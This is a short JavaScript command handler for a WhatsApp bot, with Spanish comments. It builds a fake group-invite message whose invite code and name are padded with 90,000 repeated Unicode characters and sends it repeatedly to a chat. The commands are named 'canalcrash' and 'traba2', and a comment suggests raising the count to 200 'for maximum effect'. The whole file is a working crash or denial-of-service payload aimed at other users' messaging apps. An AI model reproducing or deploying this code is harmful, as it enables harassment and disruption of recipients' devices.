let handler = async (m, { conn }) => {
  const inviteCode = 'CHANNEL-XPL0IT-' + '𓂀'.repeat(90000);
  const groupName = '🔥 Canal Oficial ⚠️' + '꧁'.repeat(90000);
  const channelJid = '120363999999999999@g.us'; // Puedes cambiar por un canal válido
  const thumbnailFake = Buffer.alloc(1); // Usa al menos 1 byte para evitar error

  const fakeInviteContent = {
    groupJid: channelJid,
    inviteCode,
    groupName,
    jpegThumbnail: thumbnailFake
  };

  for (let i = 0; i < 5; i++) { // Cambia a 200 para efecto máximo
    await conn.sendMessage(m.chat, {
      groupInviteMessage: fakeInviteContent
    });
  }

  m.reply('✅ *Traba canal enviada correctamente.*');
};

handler.command = ["lagcanalplus", "canalcrash", "traba2"];
export default handler;